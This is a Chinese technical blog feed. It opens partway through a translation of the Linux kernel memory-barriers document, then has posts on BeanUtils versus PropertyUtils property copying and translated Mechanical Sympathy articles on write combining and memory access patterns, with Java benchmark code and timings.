如果他们用于对象的引用计数器来控制生命周期，他们也许也不需要内存屏障，因为可能是引用计数内部已经实现了锁，或调用方已经考虑了锁，因此内存屏障不是必须的；
如果他们用于构建一个锁的描述，那么他们可能需要内存屏障，锁原语通用使用特定的顺序来处理这些事情；
基本上，每一个使用场景都必须仔细考虑是否需要内存屏障。
以下操作是特殊的锁原语：
	test_and_set_bit_lock();
	clear_bit_unlock();
	__clear_bit_unlock();
这些实现了诸如LOCK和UNLOCK的操作。在实现锁原语时他们也优先考虑使用，因为他们的实现可以在很多架构中进行了优化。
[！]注意：特殊的内存屏障原语在这些情况下也适用，因为某些CPU上原子指令意味着完整的内存屏障，再使用内存屏障显得多余，在这种情况下的特殊屏障原语将不需要内存屏障。
更多信息见 Documentation/atomic_ops.txt。
设备访问-----------------
许多设备都可以映射到内存上，因此对CPU来说他们只是一组内存单元。为了控制这些设备，驱动程序通常必须确保正确的顺序来正确访问内存。
然而，聪明的CPU或者聪明的编译器可能为引发潜在的问题，如果CPU或者编译器认为重排、合并、联合访问更加高效，驱动程序精心编排的指令顺序可能在实际访问设备是并不是按照这个必须的顺序访问， 这会导致设备故障。
在Linux内核中，I / O通常需要适当的访问函数 --如： inb() 或者 writel() - 他们知道如何保持适当的顺序。虽然这在大多数情况下明确的使用内存屏障不在必要，但是下面两个场景可能需要：
 （1）在某些系统中，I / O储存操作对于所有CPU并不是严格有序，所以对所有的通用设备驱动锁是必须的，并在解锁临界区之前执行mmiowb（）；
 （2）如果储存函数是用来访问一个松散访问属性的I / O存储窗口，那么需要强制内存屏障保证顺序。
更多信息参见  Documentation/DocBook/deviceiobook.tmpl。
中断----------
一个设备可能由他自己的中断服务程序中断，从而驱动程序两个部分可能会干扰彼此，尝试控制或访问该设备。
通过禁用本地中断（一种锁的形似）可以建减少这种情况，例如，驱动程序中关键的操作都包含在中断禁止的区间中 。虽然驱动程序的中断程序被执行，但是驱动程序的核心不会在相同的CPU上执行，并且直到当前的中断已被处理结束之前不允许其他中断，因此，在中断处理程序并不需要锁。
但是，考虑一个驱动使用地址寄存器和数据寄存器跟以太网卡交互，如果该驱动的核心在中断禁用下与网卡通信，然后驱动程序的中断处理程序被调用：
	LOCAL IRQ DISABLE
	writew(ADDR, 3);
	writew(DATA, y);
	LOCAL IRQ ENABLE
	<interrupt>
	writew(ADDR, 4);
	q = readw(DATA);
	</interrupt>
如果排序规则充分宽松，数据寄存器的存储可能发生在第二次地址寄存器之后：
	STORE *ADDR = 3, STORE *ADDR = 4, STORE *DATA = y, q = LOAD *DATA
如果宽松的排序规则，它必须假设中断禁止部分的内存访问可能向外泄漏，它可能会和中断部分交叉访问 - 反之亦然 - 除非使用隐或显示的屏障。
通常情况下，这不会产生问题，因为这样区间中的I / O访问将包括在严格有序的同步load操作中。形成隐式内存屏障，如果这还不够，则显式地使用一个mmiowb（）。
类似的情况可能发生在一个中断服务程序和两个运行在单独的CPU上的程序进行通信的的时候。这样的情况下应该使用中断禁用锁来保证顺序。
==========================内核I / O屏障效应==========================
访问I / O内存时，驱动应使用适当的存取函数：
 (*) inX(), outX():
     他们都旨在跟I / O空间打交道，而不是内存空间，但他们主要是一个CPU特定的概念。在 i386和x86_64处理器中确实有特殊的I / O空间的访问周期和指令，但许多CPU没有这样的概念。
     包括PCI总线也定义了I / O空间，比如在i386和x86_64的CPU 上很容易将它映射到CPU的I / O空间上。然而，对于那些不支持IO空间的CPU，它也可能作为虚拟的IO空间被映射CPU的的内存空间。
    访问这个空间可能是完全同步的（在i386），但桥设备（如PCI主桥）可能不完全履行这一点。
    他们彼此之间也完全保证访问顺序；
    对于其他类型的内存和I / O操作，他们都不能保证访问顺序。
(*) readX(), writeX():
     无论是保证完全有序还是不合并访问取决于他们访问时定义的访问窗口属性，例如，最新的i386架构的机器通过 MTRR寄存器控制。
     通常情况下，不是访问预取设备他们保证完全有序，不合并。
     然而，对于中间链接硬件（如PCI桥）可能会倾向延迟处理，当刷新一个store时，首先从同一位置load，但是对同一个设备或从同一配置空间load的是，对与PC来说一次就足够了。
     [*]注意：试图从刚写过的相同的位置load数据可能导致故障 - 考虑16550 RX / TX串行寄存器的例子。
     对于可预取的I / O内存，可能需要一个mmiowb（）屏障保证顺序；
     请参阅PCI规范获得PCI事务和接口更多信息；
 （*）readX_relaxed（）
     这些类似readX（），但在任何时候都不保证顺序。因为没有I / O读屏障。
(*) ioreadX(), iowriteX()
     他们通过选择inX()/outX() or readX()/writeX()来实际操作
========================================最小可执行的假想顺序模型========================================
首先假定概念上CPU是弱有序的，同时它又会维护程序因果关系。某些CPU（如i386或x86_64）比其他类型的CPU（如PowerPC的或FRV）受到更多的制约，所以必须假设最宽松的场景（即DEC ALPHA）无关于具体体系结构的代码；
这意味着必须考虑CPU将以任何它喜欢的顺序执行它的指令流甚至是并行的， 如果流中的某个指令依赖前面较早的指令，则该较早的指令必须在后者执行之前完全结束[*]，换句话说：保持逻辑关系。
 [*]有些指令会产生多个效果 - 如改变条件码，改变寄存器或修改内存 -不同的指令产生不同的影响；
一个CPU也可能会放弃那些最终不产生效果的指令。例如，如果两个相邻的指令加载到同一个寄存器中值，第一个可能被丢弃。
同样地，必须假定编译器可能以任何它认为合适的方式会重新排列指令流，但同样维护程序因果关系。
============================CPU缓存的影响============================
缓存内存操作，在CPU和内存间不一致会在整个系统都受一定程度的影响，通过内存的一致性维护系统状态的一致性；
CPU和系统其他部分的交互是通过cache实现，内存系统包括CPU的缓存，而内存屏障上就工作在CPU和它的缓存之间（内存屏障逻辑上如下图中的虚线）：
	    <--- CPU --->         :       <----------- Memory ----------->
	                          :
	+--------+    +--------+  :   +--------+    +-----------+
	|        |    |        |  :   |        |    |           |    +--------+
	|  CPU   |    | Memory |  :   | CPU    |    |           |    |	      |
	|  Core  |--->| Access |----->| Cache  |<-->|           |    |	      |
	|        |    | Queue  |  :   |        |    |           |--->| Memory |
	|        |    |        |  :   |        |    |           |    |	      |
	+--------+    +--------+  :   +--------+    |           |    | 	      |
	                          :                 | Cache     |    +--------+
	                          :                 | Coherency |
	                          :                 | Mechanism |    +--------+
	+--------+    +--------+  :   +--------+    |           |    |	      |
	|        |    |        |  :   |        |    |           |    |        |
	|  CPU   |    | Memory |  :   | CPU    |    |           |--->| Device |
	|  Core  |--->| Access |----->| Cache  |<-->|           |    | 	      |
	|        |    | Queue  |  :   |        |    |           |    | 	      |
	|        |    |        |  :   |        |    |           |    +--------+
	+--------+    +--------+  :   +--------+    +-----------+
	                          :
	                          :
 
虽然一些特定的load或store实际上可能不出现在CPU之外，因为它可能已经存在在CPU自己的缓存内，尽管如此如果其他CPU关心这些数据，那么完整的内存访问还是会产生，因为高速缓存一致性机制将迁移缓存行到需要访问的CPU，并且传播冲突。
程序的因果关系得以维持情况下，CPU核心可以以任何顺序执行指令，有些指令生成lod和store操作，并将他们放入内存请求队列等待执行。CPU内核可以以任意顺序放入到队列中，并继续执行，直到它强制等待某一个指令完成。
内存屏障关心的是控制访问穿越CPU到内存一边的顺序，和系统其他组建感知到的顺序。
[！]一个给定的CPU自己并不需要内存屏障，因为CPU总是可以以执行的相同顺序感知到自己的load和store指令。
[！]MMIO或其他设备访问可能绕过缓存系统。这取决于访问设备时内存窗口属性，或者某些CPU支持的特殊指令；
 
高速缓存的一致性---------------
但是事情并不像上面说的那么简单，虽然缓存被期望是一致的，但是没有保证这种一致性的顺序。这意味着在一个CPU上所做的更改最终可以被所有CPU可见，但是并不保证其他的CPU能以相同的顺序感知变化。
考虑一个系统，有一对CPU（1＆2），每一个CPU有一组并行的数据缓存（CPU 1有A / B，CPU 2有C / D）：
	            :
	            :                          +--------+
	            :      +---------+         |        |
	+--------+  : +--->| Cache A |<------->|        |
	|        |  : |    +---------+         |        |
	|  CPU 1 |<---+                        |        |
	|        |  : |    +---------+         |        |
	+--------+  : +--->| Cache B |<------->|        |
	            :      +---------+         |        |
	            :                          | Memory |
	            :      +---------+         | System |
	+--------+  : +--->| Cache C |<------->|        |
	|        |  : |    +---------+         |        |
	|  CPU 2 |<---+                        |        |
	|        |  : |    +---------+         |        |
	+--------+  : +--->| Cache D |<------->|        |
	            :      +---------+         |        |
	            :                          +--------+
	            :
 
假设该系统具有以下属性：
 （*）奇数编号的缓存行在缓存A或者Ç中，或它可能仍然驻留在内存中;
 （*）偶数编号的缓存行在缓存B或者D中，或它可能仍然驻留在内存中;
 （*）当CPU核心正在访问一个cache，其他的cache可能利用总线来访问该系统的其余组件 - 可能是取代脏缓存行或预加载；
 （*）每个cache有一个操作队列，用来维持cache与系统其余部分的一致性;
 （*）正常load以及存在在缓存行中的数据时一致性队列不会刷新，即使这些load操作可能会潜在的影响队列的内存。
接下去，试想一下，第一个CPU上有两个写操作，并且有一个写屏障在他们之间，以保证他们到达该CPU的缓存的顺序：
	CPU 1		CPU 2		COMMENT
	===============	===============	=======================================
					u == 0, v == 1 and p == &u, q == &u
	v = 2;
	smp_wmb();			Make sure change to v is visible before
					 change to p
	<A:modify v=2>			v is now in cache A exclusively
	p = &v;
	<B:modify p=&v>			p is now in cache B exclusively
写内存屏障强制系统中其他CPU能以正确的顺序感知本地CPU缓存的更改。现在假设第二个CPU要读取这些值：
	CPU 1		CPU 2		COMMENT
	===============	===============	=======================================
	...
			q = p;
			x = *q;
上述的读取操作可能不会按照预期的顺序执行，持有P的缓存行可能被第二个CPU的某一个缓存更新，而持有V的缓存行在第一个CPU的另外一个缓存中因为其他事情被延迟更新了；
	CPU 1		CPU 2		COMMENT
	===============	===============	=======================================
					u == 0, v == 1 and p == &u, q == &u
	v = 2;
	smp_wmb();
	<A:modify v=2>	<C:busy>
			<C:queue v=2>
	p = &v;		q = p;
			<D:request p>
	<B:modify p=&v>	<D:commit p=&v>
		  	<D:read p>
			x = *q;
			<C:read *q>	Reads from v before v updated in cache
			<C:unbusy>
			<C:commit v=2>
基本上，虽然两个缓存行CPU 2在最终都得到更新，但是在不进行干预的情况下不能保证更新的顺序与在CPU 1在提交的顺序一致。
所以我们需要在load之间插入一个的数据依赖性屏障或读屏障。这将迫使缓存在处理其他任务之前强制提交一致性队列；
 
	CPU 1		CPU 2		COMMENT
	===============	===============	=======================================
					u == 0, v == 1 and p == &u, q == &u
	v = 2;
	smp_wmb();
	<A:modify v=2>	<C:busy>
			<C:queue v=2>
	p = &v;		q = p;
			<D:request p>
	<B:modify p=&v>	<D:commit p=&v>
		  	<D:read p>
			smp_read_barrier_depends()
			<C:unbusy>
			<C:commit v=2>
			x = *q;
			<C:read *q>	Reads from v after v updated in cache
DEC Alpha处理器上可能会遇到这类问题，因为他们有一个分列缓存，通过更好地利用数据总线以提高性能。虽然大部分的CPU当读操作需要读取内存的时候使用数据依赖屏障，但不都这样，所以不不能依靠这样的假设。
其它CPU可能页有分列缓存，但是正常的内存访问，他们会协调各个缓存列。在Alpha 的语义中删除这种特性，需要使用内存屏障进行协调。
缓存一致性与DMA----------------------
 对于DMA的设备，并不是所有的系统都维护缓存一致性，这时访问DMA的设备可能从RAM中得到脏数据，因为脏的缓存行可能驻留在各个CPU的缓存中，并且可能还没有被写入到RAM。为了处理这种情况，内核必须刷新每个CPU缓存上的重叠位（可能直接废弃他们）。
此外，当设备以及加载自己的数据之后，可能被来自于CPU缓存的脏缓存行写回RAM所覆盖，或者当前CPU缓存的缓存行可能直接忽略RAM已被更新，直到缓存行从CPU的缓存被丢弃和重载。为了处理这个问题，内核必须废弃每个CPU缓存的重叠位。
更多信息参见Documentation/cachetlb.txt。
缓存一致性与MMIO-----------------------
I / O映射的内存通常作为CPU内存空间窗口中的一部分地址，他们与直接访问RAM的的窗口有不同的属性。
这些属性通常是，访问绕过缓存直接进入到设备总线。这意味着MMIO的访问可能先于早些时候发出的访问被缓存的内存的请求到达。在这样的情况下，一个内存屏障还不够，如果缓存的内存写和MMIO访问存在依赖，cache必须刷新；
=========================CPU能做的事情=========================
程序员可能想当然的认为CPU将完全按照指定的顺序执行内存操作，如果确实如此的话，假设CPU执行下面这段代码：
 
	a = *A;
	*B = b;
	c = *C;
	d = *D;
	*E = e;
他们会期望CPU执行下一个指令之前上一个一定执行完成，于是在系统中可以观察到一个明确的执行顺序；
	LOAD *A, STORE *B, LOAD *C, LOAD *D, STORE *E.
当然，现实中是非常混乱。对许多CPU和编译器上面假设都不成立，因为：
 （*）load操作可能更需要立即完成的，以报纸执行进度，而store往往推迟是每没有问题的;
 （*）load操作可能预取，当结果证明是不需要的，可以丢弃;
 （*）load操作可能预取，导致取数的时间和预期的事件序列不符合;
 （*）内存访问的顺序可能被重排，以更好地利用CPU总线和缓存;
 （*）当于内存和IO设备交互是load和store可能合并，以提高性能。或者可能做批访问相邻的位置，从而减少了事务设置的成本（内存和PCI设备可都能够做到这一点）;
 （*）CPU的数据缓存也可能会影响排序，虽然缓存一致性机制可以缓解 - 一旦store操作命中缓存   - 并不能保证一致性能正确的传播到其它CPU。
所以对另一个CPU，上面的代码实际观测的结果为：
	LOAD *A, ..., LOAD {*C,*D}, STORE *E, STORE *B
	(Where "LOAD {*C,*D}" is a combined load)
但是，CPU保证自己的一致性：在不需要内存屏障下，可以保证自己正确的顺序访问内存，如下面的代码：
	U = *A;
	*A = V;
	*A = W;
	X = *A;
	*A = Y;
	Z = *A;
 
假设不受到外部的影响，最终的结果将显示为：
	U == the original value of *A
	X == W
	Z == Y
	*A == Y
上面的代码CPU可能产生的全部的内存访问顺序如下：
	U=LOAD *A, STORE *A=V, STORE *A=W, X=LOAD *A, STORE *A=Y, Z=LOAD *A
对于这个顺序，如果没有干预，在保持一致的前提下。一些操作也可能被合并，丢弃；
在CPU感知这些操作之前，编译器也可能合并、丢弃、延迟加载；
例如：
	*A = V;
	*A = W;
可减少到：
	*A = W;
在没有写屏障的情况下，可以假定将V写入到*A的操作被丢弃了，同样：
	*A = Y;
	Z = *A;
没有内存屏障，可被简化为：
	*A = Y;
	Z = Y;
在CPU之外根本没有load操作。
ALPHA处理器--------------------------
DEC Alpha CPU是有最松散的CPU之一。不仅如此，一些版本的Alpha CPU有一个分列的数据缓存，允许他们在不同的时间更新更新语义相关的缓存。在同步多个缓存，保证一致性的时候，数据依赖屏障是必须的，使CPU可以正确的顺序处理指针的变化和数据的获得。
Alpha定义类Linux内核的内存屏障模型。
参见上面的“缓存一致性”章节。
============示例使用============
循环缓冲区----------------
内存屏障可以用来实现循环缓冲，不需要锁来使得生产者与消费者串行。
更多详情参考“Documentation/circular-buffers.txt”
==========参考==========
Alpha AXP Architecture Reference Manual, Second Edition (Sites & Witek,Digital Press)Chapter 5.2: Physical Address Space CharacteristicsChapter 5.4: Caches and Write BuffersChapter 5.5: Data SharingChapter 5.6: Read/Write Ordering
AMD64 Architecture Programmer's Manual Volume 2: System ProgrammingChapter 7.1: Memory-Access OrderingChapter 7.4: Buffering and Combining Memory Writes
IA-32 Intel Architecture Software Developer's Manual, Volume 3:System Programming GuideChapter 7.1: Locked Atomic OperationsChapter 7.2: Memory OrderingChapter 7.4: Serializing Instructions
The SPARC Architecture Manual, Version 9Chapter 8: Memory ModelsAppendix D: Formal Specification of the Memory ModelsAppendix J: Programming with the Memory Models
UltraSPARC Programmer Reference ManualChapter 5: Memory Accesses and CacheabilityChapter 15: Sparc-V9 Memory Models
UltraSPARC III Cu User's ManualChapter 9: Memory Models
UltraSPARC IIIi Processor User's ManualChapter 8: Memory Models
UltraSPARC Architecture 2005Chapter 9: MemoryAppendix D: Formal Specifications of the Memory Models
UltraSPARC T1 Supplement to the UltraSPARC Architecture 2005Chapter 8: Memory ModelsAppendix F: Caches and Cache Coherency
Solaris Internals, Core Kernel Architecture, p63-68:Chapter 3.3: Hardware Considerations for Locks andSynchronization
Unix Systems for Modern Architectures, Symmetric Multiprocessing and Cachingfor Kernel Programmers:Chapter 13: Other Memory Models
Intel Itanium Architecture Software Developer's Manual: Volume 1:Section 2.6: SpeculationSection 4.4: Memory Access
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
BeanUtils.copyProperties VS  PropertyUtils.copyProperties, caoyaojun1988-163-com.iteye.com.blog.1871316, Fri, 17 May 2013 23:09:59 +0800

 BeanUtils.copyProperties VS  PropertyUtils.copyProperties 
作为两个bean属性copy的工具类，他们被广泛使用，同时也很容易误用，给人造成困然；比如：昨天发现同事在使用BeanUtils.copyProperties copy有integer类型属性的bean时，没有考虑到会将null转换为0，而后面的业务依赖于null来判断，导致业务出错。下面总结一下主要的注意点：
 
大范围两个工具类都是对两个bean之前存在name相同的属性进行处理，无论是源bean或者目标bean多出的属性均不处理。
具体到BeanUtils是相同name并且类型之间支持转换的属性可以处理，而PropertyUtils不支持类型转换必须是类型和name一样才处理。
对null的处理：PropertyUtils支持为null的场景；BeanUtils对部分属性不支持null的情况，具体为下：
        1）、date类型不支持：异常 dateorg.apache.commons.beanutils.ConversionException: No value                  
          specified for 'Date'     
        2）、Ineger、Boolean、Long等不支持： 转为0；     
        3）、string：支持，保持null；
 
关于类型转换的例子：     
       源bean有属性：   private Long    dateVal;
       目标bean有属性：private Date    dateVal;
       使用 PropertyUtils，会保错：Caused by: java.lang.IllegalArgumentException: argument type mismatch
       使用BeanUtils，则相当于new date（dateVal），网上传言java.util.Date不支持，就测试来说无论是 sql     
       util 都是ok
 
对于自定义的对象类型属性  都是浅copy ：
       比如都有属性：private Base  base;   Base有一个属性String Test；
       new.getBase().setTest("new");
       那么old.getBase().getTest（）也为new
 
性能：get，set《PropertyUtils《BeanUtils
BeanUtils的高级功能org.apache.commons.beanutils.Converter接口可以自定义类型之间的转化。PropertyUtils没有。 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Mechanical Sympathy 系列翻译---合并写(write combining ), caoyaojun1988-163-com.iteye.com.blog.1868114, Mon, 13 May 2013 21:25:50 +0800

 
此文乃是翻译。。
原文地址：http://mechanical-sympathy.blogspot.com/2011/07/write-combining.html
墙内地址：http://ifeve.com/write-combining/
 
                  合并写(write combining )
    现代CPU采用大量的技术来抵消内存访问延迟。 从DRAM存储中读取或者写入数据的时间CPU可以执行上百个指令。
    用来降低这种延迟的主要手段是使用多层次的SRAM缓存。此外，也有SMP系统采用消息传递协议来实现缓存之间的一致性。即便如此，现代CPU是如此之快，是缓存根本无法企及的。因此，为了进一步降低延迟一些鲜为人知的缓冲区（buffers ）也被使用。
    本文探讨“合并写存储缓冲区（write combining store buffers）”，以及我们如何编写代码可以有效地使用它们。
     CPU缓存是一个高效的非链式结构的hash map，每个桶（bucket）通常是64个字节。被称为之为一个“缓存行（cache line）”。缓存行（cache line）是内存传输的有效单元。例如，主存中地址A会映射到一个给定的缓存行C。
     如果CPU需要访问的地址hash之后并不在缓存行（cache line）中，那么缓存中对应位置的缓存行（cache line）会失效，以便让新的值可以取代该位置的现有值。例如，如果我们有两个地址，通过hash算法hash到同一缓存行，那么新的值会覆盖老的值。
当CPU执行存储指令（store）时，它会尝试将数据写到离CPU最近的L1缓存。如果这时出现缓存失效，CPU会访问下一级缓存。这时无论是英特尔还是许多其他厂商的CPU都会使用被称为“合并写（write combining）”的技术。
    当请求L2缓存行的所有权的时候，最典型的是将处理器的store buffers中某一项写入内存的期间， 在缓存子系统( cache sub-system)准备好接收、处理的数据的期间，CPU可以继续处理其他指令。当数据不在任何缓存层中缓存时，将获得最大的优势。
    当连串的写操作需要修改相同的缓存行时，会变得非常有趣。在修改提交到L2缓存之前，这连串的写操作会首先合并到缓冲区（buffer）。 这些64字节的缓冲（buffers ）维护在一个64位的区域中，每一个字节（byte）对应一个位（bit），当缓冲区被传输到外缓存后，标志缓存是否有效。
也许你要问如果程序要读取一些已被写入缓冲区（buffer）的数据，会发生什么事呢？我们的硬件会友好的处理，它们在读取缓存之前会先读取缓冲区。
    这一切对我们的程序意味着什么呢？
    如果我们可以在缓冲区被传输到外缓存之前能够填补这些缓冲区（buffers ），那么我们将大大提高传输总线的效率。如何才能做到这一点呢？大部分程序花费其大部分时间在循环的处理某项任务。
由于这些缓冲区的数量是有限的，并且它们根据CPU的型号有所不同。例如在Intel CPU，你只能保证在同一时间拿到4个。这意味着，在一个循环中，你不应该同时写超过4个截然不同的内存位置，否则你讲不能从合并写（write combining）的中受益。
 代码如下：  
 
public final class WriteCombining {
    private static final int    ITERATIONS = Integer.MAX_VALUE;
    private static final int    ITEMS      = 1 << 24;
    private static final int    MASK       = ITEMS - 1;
    private static final byte[] arrayA     = new byte[ITEMS];
    private static final byte[] arrayB     = new byte[ITEMS];
    private static final byte[] arrayC     = new byte[ITEMS];
    private static final byte[] arrayD     = new byte[ITEMS];
    private static final byte[] arrayE     = new byte[ITEMS];
    private static final byte[] arrayF     = new byte[ITEMS];
    public static void main(final String[] args) {
        for (int i = 1; i <= 3; i++) {
            out.println(i + " SingleLoop duration (ns) = " + runCaseOne());
            out.println(i + " SplitLoop duration (ns) = " + runCaseTwo());
        }
        int result = arrayA[1] + arrayB[2] + arrayC[3] + arrayD[4] + arrayE[5] + arrayF[6];
        out.println("result = " + result);
    }
    public static long runCaseOne() {
        long start = System.nanoTime();
        int i = ITERATIONS;
        while (--i != 0) {
            int slot = i & MASK;
            byte b = (byte) i;
            arrayA[slot] = b;
            arrayB[slot] = b;
            arrayC[slot] = b;
            arrayD[slot] = b;
            arrayE[slot] = b;
            arrayF[slot] = b;
        }
        return System.nanoTime() - start;
    }
    public static long runCaseTwo() {
        long start = System.nanoTime();
        int i = ITERATIONS;
        while (--i != 0) {
            int slot = i & MASK;
            byte b = (byte) i;
            arrayA[slot] = b;
            arrayB[slot] = b;
            arrayC[slot] = b;
        }
        i = ITERATIONS;
        while (--i != 0) {
            int slot = i & MASK;
            byte b = (byte) i;
            arrayD[slot] = b;
            arrayE[slot] = b;
            arrayF[slot] = b;
        }
        return System.nanoTime() - start;
    }
}
 
 
这个程序在我的Windows 7  64位英特尔酷睿i7860@2.8 GHz系统产生以下的输出： 
 
        1 SingleLoop duration (ns) = 14019753545
 	1 SplitLoop  duration (ns) = 8972368661
 	2 SingleLoop duration (ns) = 14162455066
 	2 SplitLoop  duration (ns) = 8887610558
 	3 SingleLoop duration (ns) = 13800914725
 	3 SplitLoop  duration (ns) = 7271752889
   
    上面的例子阐明：如果在一个循环中修改6个数组位置（对应6个内存地址），我们的程序运行时间明显长于拆分工作的方式，即是：先写前3个位置，后修改后3个位置的数据。
    通过拆分循环，我们可以让程序用更少的时间完成更多的工作！欢迎来到神奇的“合并写（write combining）”。通过使用CPU架构的知识，正确的填充这些缓冲区，我们可以利用底层硬件加速我们的程序。
    不要忘了超线程（hyper-threading），可能有2个逻辑线程在竞争同一个核的缓冲区。
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Mechanical Sympathy 系列翻译  内存访问模型, caoyaojun1988-163-com.iteye.com.blog.1837535, Thu, 28 Mar 2013 17:28:18 +0800

重要的内存访问模型
在高性能的计算中，我们常说缓存失效（cache-miss）是一个算法中最大性能损失点。 近些年来，我们的处理器处理能力的增长速度已经大大超过了访问主内存的延迟的增长。 通过更宽的，多通道的总线，到主内存的带宽已经大大增加，但延迟并没有相应显著减少。 为了减少延迟，处理器采用愈加复杂的多层的高速缓存子系统。 
在1994年的一篇论文“Hitting the memory wall: implications of the obvious”中描述了这个问题，并且认为由于缓存失效（cache-miss）必定存在，缓存不能最终解决这个问题。我的目标是：向大家展示通过利用访问模型，它是对缓存层次结构的思考，上面的结论并不是必然的。
让我们带着问题，来看下面的例子， 我们的硬件试图通过一些技术来减少主内存的延迟。 内存访问模型主要基于下面三个规律：
1、时间局部性 ：最近访问过的内存最可能立马再次被访问；
2、空间局部性：相邻的内存最可能立马再次被访问；
3、 跨越式：内存访问可能会遵循一种可预测的模式。
首先让我们通过一些代码和测试结果，来说明这三个规律的正确性：
1、线性访问情形的内存访问是完全可以预测的；
2、在一个限定内存区内伪随机的访问然后跨越到另一个。 这个限定区最广为人知的就是操作系统内存页。
3、在一个大面积堆内存中伪随机访问。
下面的代码需要添加 -Xmx4g JVM选项运行： 
public class TestMemoryAccessPatterns {
    private static final int    LONG_SIZE      = 8;
    private static final int    PAGE_SIZE      = 2 * 1024 * 1024;
    private static final int    ONE_GIG        = 1024 * 1024 * 1024;
    private static final long   TWO_GIG        = 2L * ONE_GIG;
    private static final int    ARRAY_SIZE     = (int) (TWO_GIG / LONG_SIZE);
    private static final int    WORDS_PER_PAGE = PAGE_SIZE / LONG_SIZE;
    private static final int    ARRAY_MASK     = ARRAY_SIZE - 1;
    private static final int    PAGE_MASK      = WORDS_PER_PAGE - 1;
    private static final int    PRIME_INC      = 514229;
    private static final long[] memory         = new long[ARRAY_SIZE];
    static {
        for (int i = 0; i < ARRAY_SIZE; i++) {
            memory[i] = 777;
        }
    }
    public enum StrideType {
        LINEAR_WALK {
            @Override
            public int next(final int pageOffset, final int wordOffset, final int pos) {
                return (pos + 1) & ARRAY_MASK;
            }
        },
        RANDOM_PAGE_WALK {
            @Override
            public int next(final int pageOffset, final int wordOffset, final int pos) {
                return pageOffset + ((pos + PRIME_INC) & PAGE_MASK);
            }
        },
        RANDOM_HEAP_WALK {
            @Override
            public int next(final int pageOffset, final int wordOffset, final int pos) {
                return (pos + PRIME_INC) & ARRAY_MASK;
            }
        };
        public abstract int next(int pageOffset, int wordOffset, int pos);
    }
    public static void main(final String[] args) {
        final StrideType strideType;
        switch (Integer.parseInt(args[0])) {
            case 1:
                strideType = StrideType.LINEAR_WALK;
                break;
            case 2:
                strideType = StrideType.RANDOM_PAGE_WALK;
                break;
            case 3:
                strideType = StrideType.RANDOM_HEAP_WALK;
                break;
            default:
                throw new IllegalArgumentException("Unknown StrideType");
        }
        for (int i = 0; i < 5; i++) {
            perfTest(i, strideType);
        }
    }
    private static void perfTest(final int runNumber, final StrideType strideType) {
        final long start = System.nanoTime();
        int pos = -1;
        long result = 0;
        for (int pageOffset = 0; pageOffset < ARRAY_SIZE; pageOffset += WORDS_PER_PAGE) {
            for (int wordOffset = pageOffset, limit = pageOffset + WORDS_PER_PAGE; wordOffset < limit; wordOffset++) {
                pos = strideType.next(pageOffset, wordOffset, pos);
                result += memory[pos];
            }
        }
        final long duration = System.nanoTime() - start;
        final double nsOp = duration / (double) ARRAY_SIZE;
        if (208574349312L != result) {
            throw new IllegalStateException();
        }
        System.out.format("%d - %.2fns %s\n", Integer.valueOf(runNumber), Double.valueOf(nsOp), strideType);
    }
}
 结果：
Intel U4100 @ 1.3GHz, 4GB RAM DDR2 800MHz, 
Windows 7 64-bit, Java 1.7.0_05
===========================================
0 - 2.38ns LINEAR_WALK
1 - 2.41ns LINEAR_WALK
2 - 2.35ns LINEAR_WALK
3 - 2.36ns LINEAR_WALK
4 - 2.39ns LINEAR_WALK
0 - 12.45ns RANDOM_PAGE_WALK
1 - 12.27ns RANDOM_PAGE_WALK
2 - 12.17ns RANDOM_PAGE_WALK
3 - 12.22ns RANDOM_PAGE_WALK
4 - 12.18ns RANDOM_PAGE_WALK
0 - 152.86ns RANDOM_HEAP_WALK
1 - 151.80ns RANDOM_HEAP_WALK
2 - 151.72ns RANDOM_HEAP_WALK
3 - 151.91ns RANDOM_HEAP_WALK
4 - 151.36ns RANDOM_HEAP_WALK
Intel i7-860 @ 2.8GHz, 8GB RAM DDR3 1333MHz, 
Windows 7 64-bit, Java 1.7.0_05
=============================================
0 - 1.06ns LINEAR_WALK
1 - 1.05ns LINEAR_WALK
2 - 0.98ns LINEAR_WALK
3 - 1.00ns LINEAR_WALK
4 - 1.00ns LINEAR_WALK
0 - 3.80ns RANDOM_PAGE_WALK
1 - 3.85ns RANDOM_PAGE_WALK
2 - 3.79ns RANDOM_PAGE_WALK
3 - 3.65ns RANDOM_PAGE_WALK
4 - 3.64ns RANDOM_PAGE_WALK
0 - 30.04ns RANDOM_HEAP_WALK
1 - 29.05ns RANDOM_HEAP_WALK
2 - 29.14ns RANDOM_HEAP_WALK
3 - 28.88ns RANDOM_HEAP_WALK
4 - 29.57ns RANDOM_HEAP_WALK
Intel i7-2760QM @ 2.40GHz, 8GB RAM DDR3 1600MHz, 
Linux 3.4.6 kernel 64-bit, Java 1.7.0_05
=================================================
0 - 0.91ns LINEAR_WALK
1 - 0.92ns LINEAR_WALK
2 - 0.88ns LINEAR_WALK
3 - 0.89ns LINEAR_WALK
4 - 0.89ns LINEAR_WALK
0 - 3.29ns RANDOM_PAGE_WALK
1 - 3.35ns RANDOM_PAGE_WALK
2 - 3.33ns RANDOM_PAGE_WALK
3 - 3.31ns RANDOM_PAGE_WALK
4 - 3.30ns RANDOM_PAGE_WALK
0 - 9.58ns RANDOM_HEAP_WALK
1 - 9.20ns RANDOM_HEAP_WALK
2 - 9.44ns RANDOM_HEAP_WALK
3 - 9.46ns RANDOM_HEAP_WALK
4 - 9.47ns RANDOM_HEAP_WALK
  分析：
这段代码我分别在3种不同的CPU架构中运行，如上面所显示的是intel的各个发展阶段的CPU。 很显然，每一代CPU都拥有更好的降低主内存的延迟的能力。除了相对较小的堆，这个实验是基于上面3个规律。 虽然各个缓存的规模和复杂程度不断提高。 然而由于内存大小的增加，他们变得​​不那么有效了。 例如，在i7-860堆内随机访问时，如果数组容量扩大一倍，达到4GB的大小，平均延迟由大约30ns增加到大约55ns。似乎在线性访问的情形下，不存在内存延迟。 然而当我们以更加随机模式访问内存，延迟时间就更加明显。
 
